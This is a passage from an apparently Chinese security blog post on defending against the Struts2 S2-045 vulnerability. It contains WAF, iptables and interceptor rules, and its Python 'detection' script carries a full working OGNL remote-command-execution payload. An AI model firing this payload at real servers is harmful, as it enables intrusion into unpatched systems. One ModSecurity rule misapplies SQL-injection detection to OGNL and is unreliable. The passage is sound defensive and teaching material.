&lt;h2 id=&#34;检测与防护&#34;&gt;&lt;a href=&#34;#检测与防护&#34; class=&#34;headerlink&#34; title=&#34;检测与防护&#34;&gt;&lt;/a&gt;检测与防护&lt;/h2&gt;&lt;h3 id=&#34;漏洞检测脚本&#34;&gt;&lt;a href=&#34;#漏洞检测脚本&#34; class=&#34;headerlink&#34; title=&#34;漏洞检测脚本&#34;&gt;&lt;/a&gt;漏洞检测脚本&lt;/h3&gt;&lt;figure class=&#34;highlight livescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs livescript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; sys&lt;br&gt;&lt;br&gt;def check_s2_045(url):&lt;br&gt;    payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;%&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#nike&lt;/span&gt;=&amp;#x27;multipart/form-data&amp;#x27;).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#_memberAccess&lt;/span&gt;?(&lt;span class=&#34;hljs-subst&#34;&gt;#_memberAccess&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;):(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#container&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#context&lt;/span&gt;[&amp;#x27;com.opensymphony.xwork2.ActionContext.container&amp;#x27;]).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#container&lt;/span&gt;.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedPackageNames().clear()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedClasses().clear()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#context&lt;/span&gt;.setMemberAccess(&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        )).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;=&amp;#x27;echo &amp;quot;S2045_VULN_TEST&amp;quot;&amp;#x27;).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#iswin&lt;/span&gt;=(@java.lang.System@getProperty(&amp;#x27;os.name&amp;#x27;).toLowerCase().contains(&amp;#x27;win&amp;#x27;))).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#cmds&lt;/span&gt;=(&lt;span class=&#34;hljs-subst&#34;&gt;#iswin&lt;/span&gt;?&amp;#123;&amp;#x27;cmd.exe&amp;#x27;,&amp;#x27;/c&amp;#x27;,&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;&amp;#125;:&amp;#123;&amp;#x27;/bin/bash&amp;#x27;,&amp;#x27;-c&amp;#x27;,&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;&amp;#125;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;=new java.lang.ProcessBuilder(&lt;span class=&#34;hljs-subst&#34;&gt;#cmds&lt;/span&gt;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;.redirectErrorStream(true)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#process&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;.start()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (@org.apache.commons.io.IOUtils@copy(&lt;span class=&#34;hljs-subst&#34;&gt;#process&lt;/span&gt;.getInputStream(),&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;.flush())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;    &amp;#125;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;br&gt;    headers = &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Content-Type&amp;#x27;&lt;/span&gt;: payload,&lt;br&gt;        &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;User-Agent&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Mozilla/5.0 (compatible; S2-045-Scanner)&amp;#x27;&lt;/span&gt;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;br&gt;    try:&lt;br&gt;        response = requests.get(url, headers=headers, timeout=&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;S2045_VULN_TEST&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; response.text:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] &amp;#123;url&amp;#125; is vulnerable to S2-045!&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; True&lt;br&gt;        else:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[-] &amp;#123;url&amp;#125; is not vulnerable to S2-045&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; False&lt;br&gt;    except Exception &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; e:&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] Error testing &amp;#123;url&amp;#125;: &amp;#123;str(e)&amp;#125;&amp;quot;&lt;/span&gt;)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; False&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; len(sys.argv) != &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Usage: python3 s2-045-check.py &amp;lt;URL&amp;gt;&amp;quot;&lt;/span&gt;)&lt;br&gt;        sys.exit(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;br&gt;    &lt;br&gt;    target_url = sys.argv[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]&lt;br&gt;    check_s2_045(target_url)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;安全防护措施&#34;&gt;&lt;a href=&#34;#安全防护措施&#34; class=&#34;headerlink&#34; title=&#34;安全防护措施&#34;&gt;&lt;/a&gt;安全防护措施&lt;/h3&gt;&lt;h4 id=&#34;1-版本升级（根本解决方案）&#34;&gt;&lt;a href=&#34;#1-版本升级（根本解决方案）&#34; class=&#34;headerlink&#34; title=&#34;1. 版本升级（根本解决方案）&#34;&gt;&lt;/a&gt;1. 版本升级（根本解决方案）&lt;/h4&gt;&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 升级到安全版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Apache&lt;/span&gt; Struts &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;+ 或 &lt;span class=&#34;hljs-number&#34;&gt;2.5.10.1&lt;/span&gt;+&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;2-WAF规则配置&#34;&gt;&lt;a href=&#34;#2-WAF规则配置&#34; class=&#34;headerlink&#34; title=&#34;2. WAF规则配置&#34;&gt;&lt;/a&gt;2. WAF规则配置&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;ModSecurity规则&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight 1c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs 1c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 检测S2-045攻击特征&lt;/span&gt;&lt;br&gt;SecRule REQUEST_HEADERS&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;Content&lt;span class=&#34;hljs-punctuation&#34;&gt;-&lt;/span&gt;Type &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;@detectSQLi&amp;quot;&lt;/span&gt; \&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;id:1001,\&lt;/span&gt;&lt;br&gt;    phase&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    block&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    msg&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Struts2 S2-045 Attack Detected&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    logdata&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Content-Type: %&amp;#123;MATCHED_VAR&amp;#125;&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    tag&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;attack-sqli&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    tag&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&amp;#x27;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 检测OGNL表达式&lt;/span&gt;&lt;br&gt;SecRule REQUEST_HEADERS&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;Content&lt;span class=&#34;hljs-punctuation&#34;&gt;-&lt;/span&gt;Type &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;@contains %&amp;#123;&amp;quot;&lt;/span&gt; \&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;id:1002,\&lt;/span&gt;&lt;br&gt;    phase&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    block&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    msg&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Potential OGNL Injection in Content-Type&amp;#x27;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;3-网络层防护&#34;&gt;&lt;a href=&#34;#3-网络层防护&#34; class=&#34;headerlink&#34; title=&#34;3. 网络层防护&#34;&gt;&lt;/a&gt;3. 网络层防护&lt;/h4&gt;&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;# iptables规则示例&lt;br&gt;iptables -&lt;span class=&#34;hljs-selector-tag&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;INPUT&lt;/span&gt; -&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; tcp &lt;span class=&#34;hljs-attr&#34;&gt;--dport&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt; -m string &lt;span class=&#34;hljs-attr&#34;&gt;--string&lt;/span&gt; &amp;quot;%&amp;#123;&amp;quot; &lt;span class=&#34;hljs-attr&#34;&gt;--algo&lt;/span&gt; bm -j DROP&lt;br&gt;iptables -&lt;span class=&#34;hljs-selector-tag&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;INPUT&lt;/span&gt; -&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; tcp &lt;span class=&#34;hljs-attr&#34;&gt;--dport&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt; -m string &lt;span class=&#34;hljs-attr&#34;&gt;--string&lt;/span&gt; &amp;quot;ognl&amp;quot; &lt;span class=&#34;hljs-attr&#34;&gt;--algo&lt;/span&gt; bm -j DROP&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;4-应用层加固&#34;&gt;&lt;a href=&#34;#4-应用层加固&#34; class=&#34;headerlink&#34; title=&#34;4. 应用层加固&#34;&gt;&lt;/a&gt;4. 应用层加固&lt;/h4&gt;&lt;figure class=&#34;highlight scala&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs scala&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 自定义拦截器&lt;/span&gt;&lt;br&gt;public &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;SecurityInterceptor&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;AbstractInterceptor&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;    public &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; intercept(&lt;span class=&#34;hljs-type&#34;&gt;ActionInvocation&lt;/span&gt; invocation) &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;Exception&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;HttpServletRequest&lt;/span&gt; request = &lt;span class=&#34;hljs-type&#34;&gt;ServletActionContext&lt;/span&gt;.getRequest();&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; contentType = request.getContentType();&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (contentType != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; contentType.contains(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%&amp;#123;&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;SecurityException&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Malicious Content-Type detected&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; invocation.invoke();&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;实战技巧与工具&#34;&gt;&lt;a href=&#34;#实战技巧与工具&#34; class=&#34;headerlink&#34; title=&#34;实战技巧与工具&#34;&gt;&lt;/a&gt;实战技巧与工具&lt;/h2&gt;&lt;h3 id=&#34;BurpSuite插件开发&#34;&gt;&lt;a href=&#34;#BurpSuite插件开发&#34; class=&#34;headerlink&#34; title=&#34;BurpSuite插件开发&#34;&gt;&lt;/a&gt;BurpSuite插件开发&lt;/h3&gt;&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// S2-045检测插件框架&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;S2045Scanner&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;IScannerCheck&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; List&amp;lt;IScanIssue&amp;gt; &lt;span class=&#34;hljs-title function_&#34;&gt;doActiveScan&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 构造S2-045 payload&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; &lt;span 